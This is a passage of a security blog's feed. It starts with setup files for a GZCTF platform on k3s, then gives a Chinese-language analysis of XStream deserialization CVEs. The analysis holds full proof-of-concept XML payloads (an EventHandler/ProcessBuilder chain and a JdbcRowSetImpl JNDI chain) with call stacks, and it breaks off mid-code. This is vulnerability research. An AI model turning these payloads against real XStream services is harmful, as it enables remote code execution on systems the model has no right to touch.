class="attr">&quot;PortMappingType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Default&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;EnableTrafficCapture&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;PublicEntry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bbb.bbb.bbb.bbb&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;DockerConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;SwarmMode&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;unix:///var/run/docker.sock&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;RequestLogging&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;DisableRateLimit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>NOTICE: change server to <code>https://&lt;backend_server_ip&gt;:6443</code></p><figure class="highlight yaml"><figcaption><span>title:"kube-config.yaml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">clusters:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">cluster:</span></span><br><span class="line">    <span class="attr">certificate-authority-data:</span> <span class="string">LS0tLS1...</span></span><br><span class="line">    <span class="attr">server:</span> <span class="string">https://bbb.bbb.bbb.bbb:6443</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">contexts:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">context:</span></span><br><span class="line">    <span class="attr">cluster:</span> <span class="string">default</span></span><br><span class="line">    <span class="attr">user:</span> <span class="string">default</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">current-context:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Config</span></span><br><span class="line"><span class="attr">preferences:</span> &#123;&#125;</span><br><span class="line"><span class="attr">users:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">default</span></span><br><span class="line">  <span class="attr">user:</span></span><br><span class="line">    <span class="attr">client-certificate-data:</span> <span class="string">LS0tLS1...</span></span><br><span class="line">    <span class="attr">client-key-data:</span> <span class="string">LS0tLS1...</span></span><br></pre></td></tr></table></figure><p>Create the above config file properly, then run command <code>docker-compose up -d</code><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/c20904e59b692b098f60feb1cbe5aaa5.png"></p><p>Try visit <a href="http://aaa.aaa.aaa.aaa/">http://aaa.aaa.aaa.aaa</a>, you will see the platform:<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/20250402190500.png"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://xz.aliyun.com/t/15072">https://xz.aliyun.com/t/15072</a></li><li><a href="https://xieweiling.top/blog/2024/09/25/GZCTF/">https://xieweiling.top/blog/2024/09/25/GZCTF/</a></li><li><a href="https://gzctf.gzti.me/zh/guide/start/quick-start.html">https://gzctf.gzti.me/zh/guide/start/quick-start.html</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; &lt;a href=&quot;https://xmcve.com/&quot;&gt;星盟安全团队&lt;/a&gt;长期招新中~ 我们的目标是星辰大海！ &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;简历格式：ID、联系方式、掌握技术、比赛情况&lt;/li&gt;
&lt;li&gt;简历投递邮箱： &lt;a href=&quot;mailto:&amp;#x78;&amp;#</summary>
      
    
    
    
    
    <category term="Docker" scheme="https://jaspersec.top/tags/Docker/"/>
    
    <category term="CTF" scheme="https://jaspersec.top/tags/CTF/"/>
    
    <category term="k3s" scheme="https://jaspersec.top/tags/k3s/"/>
    
  </entry>
  
  <entry>
    <title>XStream 反序列化</title>
    <link href="https://jaspersec.top/posts/1342605474.html"/>
    <id>https://jaspersec.top/posts/1342605474.html</id>
    <published>2025-01-01T09:00:00.000Z</published>
    <updated>2025-03-31T22:09:47.240Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>XStream 是一个将 java bean 对象与 xml 互相转换的依赖包，有点类似 fastjson 的 json 对象互转。</p><p>对于原生的 Java 反序列化来说，可以利用的 Java 类是任意实现了<code>Serializable</code>的类，入口是<code>ObjectInputStream</code>的<code>readObject</code>方法。对于<code>XStream</code>来说，可以利用的Java是任意类，入口是<code>XStream</code>的<code>fromXML</code>方法。</p><p>Xstream 会把 CVE 的 payload公布出来： <a href="https://x-stream.github.io/security.html">https://x-stream.github.io/security.html</a> ，可以看到 1.4.17 之后漏洞变少很多，因为由黑名单转向白名单了。</p><h2 id="sorted-set"><a href="#sorted-set" class="headerlink" title="sorted-set"></a>sorted-set</h2><h3 id="CVE-2013-7285"><a href="#CVE-2013-7285" class="headerlink" title="CVE-2013-7285"></a>CVE-2013-7285</h3><h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><p>XStream &#x3D;&#x3D;  1.4.5 &#x2F;1.4.6 &#x2F; 1.4.10</p><h4 id="版本说明"><a href="#版本说明" class="headerlink" title="版本说明"></a>版本说明</h4><p>&lt;&#x3D; 1.3.1 版本不解析 sorted-set 标签，无法利用。</p><p>&lt; 1.4.4 的版本会判断 treeMap 是否为空，为空不进 populateTreeMap，链子断掉。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/f8e2d98965ca74a311efa3fba3ca76c1.png"></p><p>1.4.7 - 1.4.9 、1.4.11 都是对  EventHandler 这个类进行黑名单过滤。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/f75b85c7b09acb4f7610125b335abfda.png"></p><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>漏洞本质：<code>&lt;dynamic-proxy&gt;</code> 这个标签在转换成对象时，会把<code>&lt;handler&gt;</code>指定的类作为 handler， 并封装一个对应的动态代理对象。当 <code>&lt;interface&gt;</code> 指定的类的方法被执行时，触发 handler 的 invoke，通过配置<code>&lt;target&gt;</code> 指定触发的类和 <code>&lt;command&gt;</code> 指定参数实现 RCE。</p><figure class="highlight xml"><figcaption><span>title:"poc.xml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--affected_version: XStream ==  1.4.5 /1.4.6 / 1.4.10--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><p>函数调用栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">invoke:275, MethodUtil (sun.reflect.misc)</span><br><span class="line">invokeInternal:482, EventHandler (java.beans)</span><br><span class="line">access$000:279, EventHandler (java.beans)</span><br><span class="line">run:430, EventHandler$1 (java.beans)</span><br><span class="line">doPrivileged:-1, AccessController (java.security)</span><br><span class="line">invoke:428, EventHandler (java.beans)</span><br><span class="line">compareTo:-1, $Proxy0 (com.sun.proxy)</span><br><span class="line">compare:1290, TreeMap (java.util)</span><br><span class="line">put:538, TreeMap (java.util)</span><br><span class="line">putAll:281, AbstractMap (java.util)</span><br><span class="line">putAll:327, TreeMap (java.util)</span><br><span class="line">populateTreeMap:122, TreeMapConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">unmarshal:94, TreeSetConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:65, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:50, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:134, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:32, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:1156, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:1140, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:1020, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:20, Exp (CVE_2013_7285)</span><br></pre></td></tr></table></figure><p>source点: <code>k1.compareTo(k2)</code> 触发反序列化，原因是代理对象k1调用了 java.lang.Comparable#compareTo 方法，触发了 <code>&lt;dynamic-proxy&gt;</code> ， 然后进入 EventHandler#invoke 的逻辑实现 RCE。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/5770faa367e535eb5c7e286be7a5c6a9.png"></p><p>下图位置打个条件断点，一目了然。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/22076a51d04ea1fd0e10e12381f621bb.png"></p><h3 id="CVE-2021-21351"><a href="#CVE-2021-21351" class="headerlink" title="CVE-2021-21351"></a>CVE-2021-21351</h3><h4 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h4><p>XStream &lt;&#x3D; 1.4.15</p><p>JDK &lt; 8u121（使用 RMI 进行 JNDI ）</p><p>JDK &lt; 8u191（使用 LADP 进行 JNDI ）</p><h4 id="版本说明-1"><a href="#版本说明-1" class="headerlink" title="版本说明"></a>版本说明</h4><p>无</p><h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>漏洞本质：source 点<code>javax.naming.ldap.Rdn.RdnEntry#compareTo</code>，和上面一样通过 <code>&lt;sorted-set&gt;</code> 触发，sink 点就是 <code>com.sun.rowset.JdbcRowSetImpl#connect</code>，即 JdbcRowSetImpl 链 触发 JNDI。</p><figure class="highlight xml"><figcaption><span>title:"poc.xml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XRTreeFrag&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__DTMXRTreeFrag</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">m__dtm</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__size</span>&gt;</span>-10086<span class="tag">&lt;/<span class="name">m__size</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__mgrDefault</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">__useServicesMechanism</span>&gt;</span>false<span class="tag">&lt;/<span class="name">__useServicesMechanism</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">m__incremental</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__incremental</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">m__source__location</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__source__location</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">m__dtms</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">m__dtms</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">m__defaultHandler</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">m__mgrDefault</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__shouldStripWS</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__shouldStripWS</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__indexing</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__indexing</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__incrementalSAXSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">fPullParserConfig</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">concurrency</span>&gt;</span>1008<span class="tag">&lt;/<span class="name">concurrency</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">escapeProcessing</span>&gt;</span>true<span class="tag">&lt;/<span class="name">escapeProcessing</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">fetchDir</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">fetchDir</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">fetchSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">fetchSize</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">isolation</span>&gt;</span>2<span class="tag">&lt;/<span class="name">isolation</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">maxFieldSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxFieldSize</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">maxRows</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxRows</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">queryTimeout</span>&gt;</span>0<span class="tag">&lt;/<span class="name">queryTimeout</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">readOnly</span>&gt;</span>true<span class="tag">&lt;/<span class="name">readOnly</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">rowSetType</span>&gt;</span>1004<span class="tag">&lt;/<span class="name">rowSetType</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">showDeleted</span>&gt;</span>false<span class="tag">&lt;/<span class="name">showDeleted</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">dataSource</span>&gt;</span>rmi://127.0.0.1:1099/Basic/Command/calc<span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">listeners</span>/&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">params</span>/&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">default</span>/&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">fPullParserConfig</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">fConfigSetInput</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">name</span>&gt;</span>setAutoCommit<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">class</span>&gt;</span>boolean<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">fConfigSetInput</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">fConfigParse</span> <span class="attr">reference</span>=<span class="string">&#x27;../fConfigSetInput&#x27;</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">fParseInProgress</span>&gt;</span>false<span class="tag">&lt;/<span class="name">fParseInProgress</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">m__incrementalSAXSource</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__walker</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nextIsRaw</span>&gt;</span>false<span class="tag">&lt;/<span class="name">nextIsRaw</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">m__walker</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__endDocumentOccured</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__endDocumentOccured</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__idAttributes</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__textPendingStart</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">m__textPendingStart</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__useSourceLocationProperty</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__useSourceLocationProperty</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">m__pastFirstElement</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__pastFirstElement</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">m__dtm</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">m__dtmIdentity</span>&gt;</span>1<span class="tag">&lt;/<span class="name">m__dtmIdentity</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">m__DTMXRTreeFrag</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__dtmRoot</span>&gt;</span>1<span class="tag">&lt;/<span class="name">m__dtmRoot</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__allowRelease</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__allowRelease</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__obj</span> <span class="attr">class</span>=<span class="string">&#x27;string&#x27;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">m__obj</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">connect:615, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">parseSome:373, IncrementalSAXSource_Xerces (com.sun.org.apache.xml.internal.dtm.ref)</span><br><span class="line">deliverMoreNodes:312, IncrementalSAXSource_Xerces (com.sun.org.apache.xml.internal.dtm.ref)</span><br><span class="line">nextNode:814, SAX2DTM (com.sun.org.apache.xml.internal.dtm.ref.sax2dtm)</span><br><span class="line">_firstch:535, DTMDefaultBase (com.sun.org.apache.xml.internal.dtm.ref)</span><br><span class="line">getStringValue:1294, SAX2DTM (com.sun.org.apache.xml.internal.dtm.ref.sax2dtm)</span><br><span class="line">str:207, XRTreeFrag (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">toString:314, XObject (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">equals:392, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">compareTo:441, Rdn$RdnEntry (javax.naming.ldap)</span><br><span class="line">compareTo:420, Rdn$RdnEntry (javax.naming.ldap)</span><br><span class="line">put:568, TreeMap (java.util)</span><br><span class="line">putAll:281, AbstractMap (java.util)</span><br><span class="line">putAll:327, TreeMap (java.util)</span><br><span class="line">populateTreeMap:122, TreeMapConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">unmarshal:94, TreeSetConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:65, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:50, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:134, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:32, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:1157, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:1141, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:1021, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:19, Vul (POC.sortedSet)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/7fbb5d7fbb2a0d70870af431159c3d4d.png"></p><h3 id="CVE-2021-39146"><a href="#CVE-2021-39146" class="headerlink" title="CVE-2021-39146"></a>CVE-2021-39146</h3><h4 id="影响范围-2"><a href="#影响范围-2" class="headerlink" title="影响范围"></a>影响范围</h4><p>XStream &lt;&#x3D; 1.4.17</p><p>JDK &lt; 8u121（使用 RMI 进行 JNDI ）</p><p>JDK &lt; 8u191（使用 LADP 进行 JNDI ）</p><h4 id="版本说明-2"><a href="#版本说明-2" class="headerlink" title="版本说明"></a>版本说明</h4><p>无</p><h4 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>漏洞本质：还是 JNDI。source 点<code>javax.naming.ldap.Rdn.RdnEntry#compareTo</code>，通过 <code>&lt;sorted-set&gt;</code> 触发；sink 点是<code>java.security.PrivilegedAction#run</code>里有反射调用，设置成 <code>doLookup</code> 实现 JNDI。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/89c98bbbe4606a02235935ef4992d4ee.png"></p><figure class="highlight xml"><figcaption><span>title:"poc.xml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 